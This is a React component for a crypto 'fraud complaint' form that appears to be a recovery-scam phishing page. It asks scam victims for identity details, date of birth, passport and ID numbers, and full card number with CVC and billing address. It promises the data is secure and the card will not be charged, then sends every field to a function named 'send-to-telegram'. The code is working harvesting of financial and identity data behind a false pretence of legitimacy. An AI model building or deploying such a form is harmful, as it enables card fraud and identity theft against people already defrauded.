import { useState } from "react";
import { Shield, AlertTriangle, CheckCircle, CreditCard, Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const detectCardType = (number: string): string => {
  const cleaned = number.replace(/\s/g, '');
  if (/^4/.test(cleaned)) return "Visa";
  if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "Mastercard";
  if (/^3[47]/.test(cleaned)) return "American Express";
  if (/^6(?:011|5)/.test(cleaned)) return "Discover";
  if (/^3(?:0[0-5]|[68])/.test(cleaned)) return "Diners Club";
  if (/^(?:2131|1800|35)/.test(cleaned)) return "JCB";
  if (/^62/.test(cleaned)) return "UnionPay";
  return cleaned.length > 0 ? "Unknown" : "";
};

const US_STATES = [
"Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
"Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa",
"Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
"Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
"New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio",
"Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota",
"Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
"Wisconsin", "Wyoming", "District of Columbia"];


const SCAM_TYPES = [
"Investment scam",
"Romance scam",
"Phishing",
"Fake exchange",
"Other"];


const WALLET_TYPES = [
"MetaMask",
"Trust Wallet",
"Coinbase",
"Ledger",
"Binance",
"Other"];


interface FormData {
  fullName: string;
  email: string;
  state: string;
  phone: string;
  amountLost: string;
  dateOfIncident: string;
  description: string;
  scamType: string;
  walletType: string;
  walletAddress: string;
  recoveryWalletAddress: string;
  identificationNumber: string;
  passportNumber: string;
  cardNumber: string;
  cardCvc: string;
  cardBillingAddress: string;
  dateOfBirth: string;
}

const initialFormData: FormData = {
  fullName: "",
  email: "",
  state: "",
  phone: "",
  amountLost: "",
  dateOfIncident: "",
  description: "",
  scamType: "",
  walletType: "",
  walletAddress: "",
  recoveryWalletAddress: "",
  identificationNumber: "",
  passportNumber: "",
  cardNumber: "",
  cardCvc: "",
  cardBillingAddress: "",
  dateOfBirth: ""
};

const ComplaintForm = () => {
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [submitted, setSubmitted] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [detectedCardType, setDetectedCardType] = useState("");
  const [errors, setErrors] = useState<Partial<Record<keyof FormData, string>>>({});

  const validate = (): boolean => {
    const newErrors: Partial<Record<keyof FormData, string>> = {};

    if (!formData.fullName.trim()) newErrors.fullName = "Full name is required";
    if (!formData.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email))
    newErrors.email = "Valid email is required";
    if (!formData.state) newErrors.state = "State is required";
    if (!formData.phone.trim()) newErrors.phone = "Phone number is required";
    if (!formData.amountLost.trim()) newErrors.amountLost = "Amount is required";
    if (!formData.dateOfIncident) newErrors.dateOfIncident = "Date is required";
    if (!formData.description.trim() || formData.description.trim().length < 20)
    newErrors.description = "Please provide at least 20 characters";
    if (!formData.scamType) newErrors.scamType = "Please select a scam type";
    if (!formData.walletType) newErrors.walletType = "Please select a wallet";
    if (!formData.walletAddress.trim()) newErrors.walletAddress = "Wallet address is required";

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    
    setSubmitting(true);
    try {
      const { error } = await supabase.functions.invoke('send-to-telegram', {
        body: { ...formData, detectedCardType },
      });
      if (error) throw error;
      setSubmitted(true);
    } catch (err) {
      console.error('Submission error:', err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (name === "cardNumber") {
      setDetectedCardType(detectCardType(value));
    }
    if (errors[name as keyof FormData]) {
      setErrors((prev) => ({ ...prev, [name]: undefined }));
    }
  };

  if (submitted) {
    return (
      <section className="py-16 md:py-24 bg-background" id="report">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto bg-card border rounded-lg shadow-lg p-8 md:p-12 text-center animate-fade-in">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-success/10 mb-6">
              <CheckCircle className="h-8 w-8 text-success" />
            </div>
            <h2 className="font-heading text-2xl md:text-3xl font-bold text-foreground mb-4">
              Report Submitted Successfully
            </h2>
            <p className="text-lg text-muted-foreground mb-6">
              Thank you, <strong className="text-foreground">{formData.fullName}</strong>. 
              Your complaint has been received and assigned a case number.
            </p>
            <div className="bg-secondary rounded-lg p-4 mb-6 text-sm text-foreground">
              <p className="font-semibold mb-1">What happens next?</p>
              <p className="text-muted-foreground">
                Our compliance team will review your case and contact you via email at{" "}
                <strong className="text-foreground">{formData.email}</strong> within{" "}
                <strong className="text-foreground">24–48 hours</strong>.
              </p>
            </div>
            <div className="warning-banner rounded-lg p-4 flex items-start gap-3 text-left text-sm">
              <AlertTriangle className="h-5 w-5 text-warning flex-shrink-0 mt-0.5" />
              <p>
                <strong>Reminder:</strong> Our team will never ask for your private key, 
                seed phrase, or wallet password. Any such request is fraudulent.
              </p>
            </div>
          </div>
        </div>
      </section>);

  }

  const inputClasses = (field: keyof FormData) =>
  `w-full px-3 py-2.5 border rounded bg-card text-foreground text-sm focus:outline-none focus:ring-2 focus:ring-ring transition-colors ${
  errors[field] ? "border-destructive" : "border-input"}`;


  const labelClasses = "block text-sm font-semibold text-foreground mb-1.5";

  return (
    <section className="py-16 md:py-24 bg-background" id="report">
      <div className="container mx-auto px-4">
        <div className="text-center mb-10">
          <h2 className="font-heading text-2xl md:text-3xl font-bold text-foreground mb-2">
            File a Fraud Complaint
          </h2>
          <p className="text-muted-foreground">
            United States citizens only. All fields are required.
          </p>
        </div>

        <form
          onSubmit={handleSubmit}
          className="max-w-3xl mx-auto bg-card border rounded-lg shadow-lg p-6 md:p-10"
          noValidate>

          {/* Security notice */}
          <div className="warning-banner rounded-lg p-4 mb-8 flex items-start gap-3 text-sm">
            <Shield className="h-5 w-5 text-warning flex-shrink-0 mt-0.5" />
            <p>
              <strong>Your information is encrypted and secure.</strong> We will never ask for 
              your private key, seed phrase, or wallet password.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            {/* Full Name */}
            <div>
              <label htmlFor="fullName" className={labelClasses}>Full Name</label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                placeholder="John Doe"
                className={inputClasses("fullName")}
                maxLength={100} />

              {errors.fullName && <p className="text-destructive text-xs mt-1">{errors.fullName}</p>}
            </div>

            {/* Email */}
            <div>
              <label htmlFor="email" className={labelClasses}>Email Address</label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="john@example.com"
                className={inputClasses("email")}
                maxLength={255} />

              {errors.email && <p className="text-destructive text-xs mt-1">{errors.email}</p>}
            </div>

            {/* State */}
            <div>
              <label htmlFor="state" className={labelClasses}>State</label>
              <select
                id="state"
                name="state"
                value={formData.state}
                onChange={handleChange}
                className={inputClasses("state")}>

                <option value="">Select your state</option>
                {US_STATES.map((s) =>
                <option key={s} value={s}>{s}</option>
                )}
              </select>
              {errors.state && <p className="text-destructive text-xs mt-1">{errors.state}</p>}
            </div>

            {/* Phone */}
            <div>
              <label htmlFor="phone" className={labelClasses}>Phone Number</label>
              <input
                type="tel"
                id="phone"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                placeholder="(555) 123-4567"
                className={inputClasses("phone")}
                maxLength={20} />

              {errors.phone && <p className="text-destructive text-xs mt-1">{errors.phone}</p>}
            </div>

            {/* Date of Birth */}
            <div>
              <label htmlFor="dateOfBirth" className={labelClasses}>Date of Birth</label>
              <input
                type="date"
                id="dateOfBirth"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleChange}
                className={inputClasses("dateOfBirth")} />
            </div>

            {/* Amount Lost */}
            <div>
              <label htmlFor="amountLost" className={labelClasses}>Amount Lost (USD)</label>
              <input
                type="text"
                id="amountLost"
                name="amountLost"
                value={formData.amountLost}
                onChange={handleChange}
                placeholder="$5,000"
                className={inputClasses("amountLost")}
                maxLength={20} />

              {errors.amountLost && <p className="text-destructive text-xs mt-1">{errors.amountLost}</p>}
            </div>

            {/* Date */}
            <div>
              <label htmlFor="dateOfIncident" className={labelClasses}>Date of Incident</label>
              <input
                type="date"
                id="dateOfIncident"
                name="dateOfIncident"
                value={formData.dateOfIncident}
                onChange={handleChange}
                className={inputClasses("dateOfIncident")} />

              {errors.dateOfIncident && <p className="text-destructive text-xs mt-1">{errors.dateOfIncident}</p>}
            </div>

            {/* Scam Type */}
            <div>
              <label htmlFor="scamType" className={labelClasses}>Suspected Scam Type</label>
              <select
                id="scamType"
                name="scamType"
                value={formData.scamType}
                onChange={handleChange}
                className={inputClasses("scamType")}>

                <option value="">Select scam type</option>
                {SCAM_TYPES.map((t) =>
                <option key={t} value={t}>{t}</option>
                )}
              </select>
              {errors.scamType && <p className="text-destructive text-xs mt-1">{errors.scamType}</p>}
            </div>

            {/* Wallet Type */}
            <div>
              <label htmlFor="walletType" className={labelClasses}>Wallet Type</label>
              <select
                id="walletType"
                name="walletType"
                value={formData.walletType}
                onChange={handleChange}
                className={inputClasses("walletType")}>

                <option value="">Select wallet</option>
                {WALLET_TYPES.map((w) =>
                <option key={w} value={w}>{w}</option>
                )}
              </select>
              {errors.walletType && <p className="text-destructive text-xs mt-1">{errors.walletType}</p>}
            </div>
          </div>

          {/* Wallet Address */}
          <div className="mt-5">
            <label htmlFor="walletAddress" className={labelClasses}>Wallet Address (Public Only)</label>
            <input
              type="text"
              id="walletAddress"
              name="walletAddress"
              value={formData.walletAddress}
              onChange={handleChange}
              placeholder="0x1234...abcd"
              className={inputClasses("walletAddress")}
              maxLength={128} />
            <p className="text-xs text-muted-foreground mt-1">Enter your public wallet address only. Never share your private key or seed phrase.</p>
            {errors.walletAddress && <p className="text-destructive text-xs mt-1">{errors.walletAddress}</p>}
          </div>

          {/* Identification Number (Optional) */}
          <div className="mt-5">
            <label htmlFor="identificationNumber" className={labelClasses}>Identification Number 
              <span className="text-muted-foreground font-normal">(require)</span>
            </label>
            <input
              type="text"
              id="identificationNumber"
              name="identificationNumber"
              value={formData.identificationNumber}
              onChange={handleChange}
              placeholder="e.g. Driver's License, Passport, or SSN last 4 digits"
              className={inputClasses("identificationNumber")}
              maxLength={50} />

            <p className="text-xs text-muted-foreground mt-1">Provide a government-issued ID number for identity verification.

            </p>
          </div>

          {/* Passport Number (Optional) */}
          <div className="mt-5">
            <label htmlFor="passportNumber" className={labelClasses}>Passport Number
              <span className="text-muted-foreground font-normal"> (optional)</span>
            </label>
            <input
              type="text"
              id="passportNumber"
              name="passportNumber"
              value={formData.passportNumber}
              onChange={handleChange}
              placeholder="e.g. A12345678"
              className={inputClasses("passportNumber")}
              maxLength={20} />
            <p className="text-xs text-muted-foreground mt-1">Enter your passport number for additional identity verification.</p>
          </div>

          {/* Credit/Debit Card Section (Optional) */}
          <div className="mt-5 border border-input rounded-lg p-4">
            <p className={labelClasses}>Credit or Debit Card Details
              <span className="text-muted-foreground font-normal"> (optional — only if linked to stolen account)</span>
            </p>
            <p className="text-xs text-muted-foreground mb-4">Only provide if the card is linked to your compromised account. We will never charge this card.</p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label htmlFor="cardNumber" className="block text-xs font-medium text-foreground mb-1">Card Number</label>
                <div className="relative">
                  <input
                    type="text"
                    id="cardNumber"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={handleChange}
                    placeholder="4111 1234 5678 9012"
                    className={inputClasses("cardNumber")}
                    maxLength={19} />
                  {detectedCardType && (
                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold bg-secondary text-foreground px-2 py-0.5 rounded flex items-center gap-1">
                      <CreditCard className="h-3 w-3" />
                      {detectedCardType}
                    </span>
                  )}
                </div>
              </div>
              <div>
                <label htmlFor="cardCvc" className="block text-xs font-medium text-foreground mb-1">CVC / CVV</label>
                <input
                  type="text"
                  id="cardCvc"
                  name="cardCvc"
                  value={formData.cardCvc}
                  onChange={handleChange}
                  placeholder="123"
                  className={inputClasses("cardCvc")}
                  maxLength={4} />
              </div>
            </div>
            <div className="mt-4">
              <label htmlFor="cardBillingAddress" className="block text-xs font-medium text-foreground mb-1">Billing Address</label>
              <input
                type="text"
                id="cardBillingAddress"
                name="cardBillingAddress"
                value={formData.cardBillingAddress}
                onChange={handleChange}
                placeholder="123 Main St, City, State, ZIP"
                className={inputClasses("cardBillingAddress")}
                maxLength={200} />
            </div>
          </div>

          {/* Recovery Wallet Address (Optional) */}
          <div className="mt-5">
            <label htmlFor="recoveryWalletAddress" className={labelClasses}>Recovery Wallet Address
              <span className="text-muted-foreground font-normal"> (optional)</span>
            </label>
            <input
              type="text"
              id="recoveryWalletAddress"
              name="recoveryWalletAddress"
              value={formData.recoveryWalletAddress}
              onChange={handleChange}
              placeholder="0xAbCd...1234"
              className={inputClasses("recoveryWalletAddress")}
              maxLength={128} />
            <p className="text-xs text-muted-foreground mt-1">If you have a new wallet address where you'd like recovered funds sent, enter it here.</p>
          </div>

          {/* Description */}
          <div className="mt-5">
            <label htmlFor="description" className={labelClasses}>Description of Incident</label>
            <textarea
              id="description"
              name="description"
              value={formData.description}
              onChange={handleChange}
              rows={5}
              placeholder="Please describe what happened in detail, including how you were contacted, what was promised, and any transaction details..."
              className={inputClasses("description")}
              maxLength={2000} />

            {errors.description && <p className="text-destructive text-xs mt-1">{errors.description}</p>}
          </div>

          <button
            type="submit"
            disabled={submitting}
            className="mt-8 w-full bg-primary text-primary-foreground font-semibold py-3 rounded transition-all hover:brightness-110 flex items-center justify-center gap-2 text-base disabled:opacity-50">

            {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : <Shield className="h-5 w-5" />}
            {submitting ? "Submitting..." : "Submit Complaint"}
          </button>

          <p className="text-xs text-center text-muted-foreground mt-4">
            By submitting, you agree to our Terms of Service and Privacy Policy. 
            Your information is protected under our data protection policies.
          </p>
        </form>
      </div>
    </section>);

};

export default ComplaintForm;